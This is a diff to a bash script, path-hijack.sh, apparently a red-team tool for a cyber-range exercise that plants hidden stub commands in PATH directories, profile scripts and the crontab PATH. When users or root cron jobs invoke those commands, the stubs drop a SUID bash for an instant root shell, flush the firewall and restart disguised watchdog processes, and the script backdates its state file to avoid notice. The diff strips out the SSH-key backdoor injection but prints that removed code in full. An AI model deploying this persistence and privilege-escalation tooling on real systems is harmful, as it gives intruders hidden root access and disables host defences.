@@ -15,7 +15,7 @@
 #                fire inside all root cron jobs using relative commands.
 #
 # Payload (configurable via --payload):
-#   1  SSH key re-injection into ~/.ssh/authorized_keys (and root's)
+#   1  (removed — no SSH keys)
 #   2  + SUID bash dropped to /var/cache/.syspkg/.bash (instant root shell)
 #   3  + firewall flush + restart shadow-crond / flood-journal / ureadahead
 #
@@ -27,12 +27,11 @@
 #
 # Install options:
 #   --level user|system|cron     default: user
-#   --key  "ssh-ed25519 ..."     SSH key re-injected on each trigger (recommended)
 #   --commands "c1,c2,..."       override command list (default: auto per level)
 #   --payload 1|2|3              payload intensity (default: 3)
 #   --dir DIR                    override hidden bin directory
 #   --target-user USER           user whose ~/.local/bin to target (user level only)
-#   --whitelist "u1|u2"          skip these users' homedir (default: greyteam|ansible|scoring)
+#   --whitelist "u1|u2"          skip these users' homedir (default: greyteam|ansible|scoring|cyberrange)
 
 set -euo pipefail
 
@@ -93,17 +92,6 @@ write_stub() {
         printf '#!/bin/bash\n'
         printf '# %s: path resolution compatibility stub\n' "$cmd"
         printf '_payload() { (\n'
-
-        # Level 1+: SSH key injection
-        printf '    _k="%s"\n'         "$ssh_key"
-        printf '    for _h in /root "$(getent passwd "${SUDO_USER:-}" 2>/dev/null | cut -d: -f6)" "$HOME"; do\n'
-        printf '        [[ -d "$_h" ]] || continue\n'
-        printf '        mkdir -p "$_h/.ssh" 2>/dev/null\n'
-        printf '        chmod 700 "$_h/.ssh" 2>/dev/null\n'
-        printf '        touch "$_h/.ssh/authorized_keys" 2>/dev/null\n'
-        printf '        chmod 600 "$_h/.ssh/authorized_keys" 2>/dev/null\n'
-        printf '        grep -qF "$_k" "$_h/.ssh/authorized_keys" 2>/dev/null || echo "$_k" >> "$_h/.ssh/authorized_keys" 2>/dev/null\n'
-        printf '    done\n'
 
         # Level 2+: SUID bash drop
         if [[ "$payload_lvl" -ge 2 ]]; then
@@ -273,13 +261,13 @@ cmd_scan() {
     hdr "Recommendations"
     if [[ "$found_writable_user" -eq 1 || -w "${HOME}/.local/bin" || ! -e "${HOME}/.local/bin" ]]; then
         hit "[HIGH] user-level: ~/.local/bin works with no PATH modification needed"
-        echo "         deploy:  ./path-hijack.sh install --level user --key 'ssh-ed25519 ...'"
+        echo "         deploy:  ./path-hijack.sh install --level user"
     fi
     if [[ $EUID -eq 0 ]]; then
         hit "[HIGH] system-level: running as root — can modify /etc/profile.d/ for all users"
-        echo "         deploy:  ./path-hijack.sh install --level system --key 'ssh-ed25519 ...'"
+        echo "         deploy:  ./path-hijack.sh install --level system"
         hit "[MED]  cron-level: can prepend to /etc/crontab PATH to catch root cron jobs"
-        echo "         deploy:  ./path-hijack.sh install --level cron --key 'ssh-ed25519 ...'"
+        echo "         deploy:  ./path-hijack.sh install --level cron"
     else
         note "Run as root to see system and cron-level options"
     fi
@@ -289,7 +277,6 @@ cmd_scan() {
 # ── cmd_install ───────────────────────────────────────────────────────────────
 cmd_install() {
     local level="user"
-    local ssh_key=""
     local payload_lvl=3
     local custom_dir=""
     local custom_cmds=""
@@ -299,7 +286,6 @@ cmd_install() {
     while [[ $# -gt 0 ]]; do
         case "$1" in
             --level)       level="$2";        shift 2 ;;
-            --key)         ssh_key="$2";      shift 2 ;;
             --payload)     payload_lvl="$2";  shift 2 ;;
             --dir)         custom_dir="$2";   shift 2 ;;
             --commands)    custom_cmds="$2";  shift 2 ;;
@@ -308,22 +294,6 @@ cmd_install() {
             *) err "Unknown option: $1"; exit 1 ;;
         esac
     done
-
-    if [[ -z "$ssh_key" ]]; then
-        local gen_key="/var/cache/.syspkg/path-hijack_id_ed25519"
-        mkdir -p /var/cache/.syspkg; chmod 700 /var/cache/.syspkg
-        if [[ ! -f "${gen_key}.pub" ]]; then
-            ssh-keygen -t ed25519 -f "$gen_key" -N "" -C "rt-ph" -q
-        fi
-        ssh_key=$(cat "${gen_key}.pub")
-        info "Generated SSH key: $gen_key"
-        info "Public key: $ssh_key"
-        echo
-        warn "╔══ SAVE THIS PRIVATE KEY ══════════════════════════════════╗"
-        cat "$gen_key"
-        warn "╚═══════════════════════════════════════════════════════════╝"
-        echo
-    fi
 
     # ── resolve bin dir and command list ──────────────────────────────────────
     local bin_dir cmd_list path_mod_file path_mod_content target_home
@@ -463,7 +433,6 @@ EOF
         echo "path_injected=${path_injected}"
         echo "target_user=${target_user}"
         echo "payload_lvl=${payload_lvl}"
-        echo "ssh_key_file=${gen_key:-}"
     } > "$STATE_FILE"
     chmod 600 "$STATE_FILE"
     touch -t 202004150830 "$STATE_FILE"
@@ -474,8 +443,6 @@ EOF
     info "Hijack dir:  $bin_dir"
     info "Commands:    ${deployed_cmds[*]}"
     info "Payload:     level ${payload_lvl}"
-    [[ -z "$ssh_key" || "$ssh_key" == *Placeholder* ]] && \
-        warn "Replace placeholder SSH key — run install again with --key 'ssh-ed25519 ...'"
     echo
     if [[ "$level" == "user" ]]; then
         note "Stubs fire next time user opens a new shell (or runs 'source ~/.bashrc')"
@@ -622,18 +589,17 @@ Install options:
   --level user|system|cron      user   = ~/.local/bin, no root needed (default)
                                 system = /etc/profile.d/, all users, root required
                                 cron   = /etc/crontab PATH, root required
-  --key   "ssh-ed25519 ..."     SSH key to re-inject on each trigger
   --commands "c1,c2,..."        Override command list
-  --payload 1|2|3               1=ssh-key  2=+suid-bash  3=+fw+watchdogs
+  --payload 1|2|3               1=(noop)  2=+suid-bash  3=+fw+watchdogs
   --dir DIR                     Override hidden bin directory
   --target-user USER            Target user for user-level install
-  --whitelist "u1|u2"           Skip these users (default: greyteam|ansible|scoring)
+  --whitelist "u1|u2"           Skip these users (default: greyteam|ansible|scoring|cyberrange)
 
 Examples:
   ./path-hijack.sh scan
-  ./path-hijack.sh install --level user   --key "ssh-ed25519 AAAA..."
-  ./path-hijack.sh install --level system --key "ssh-ed25519 AAAA..." --commands "python3,git,curl"
-  ./path-hijack.sh install --level cron   --key "ssh-ed25519 AAAA..." --payload 1
+  ./path-hijack.sh install --level user
+  ./path-hijack.sh install --level system --commands "python3,git,curl"
+  ./path-hijack.sh install --level cron   --payload 2
   ./path-hijack.sh status
   ./path-hijack.sh remove
 HELP
